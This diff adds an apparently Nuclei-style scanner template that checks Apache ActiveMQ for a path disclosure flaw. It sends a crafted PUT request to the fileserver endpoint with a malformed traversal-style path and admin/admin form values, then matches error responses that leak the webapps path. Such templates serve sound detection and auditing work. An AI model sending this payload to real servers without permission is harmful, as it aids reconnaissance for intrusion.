@@ -1,0 +1,27 @@
+id: activemq-path-disclosure
+
+info:
+  name: ActiveMQ Path Disclosure
+  author: xc
+  severity: info
+  description: |-
+    ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息
+
+http:
+  - raw:
+      - |
+        PUT /fileserver/a../../%08/..%08/.%08/%08\\ HTTP/1.1
+        Host: {{Hostname}}
+
+        username=admin&password=admin
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "\\webapps\\fileserver\\"
+          - "/webapps/fileserver/"
+        part: body
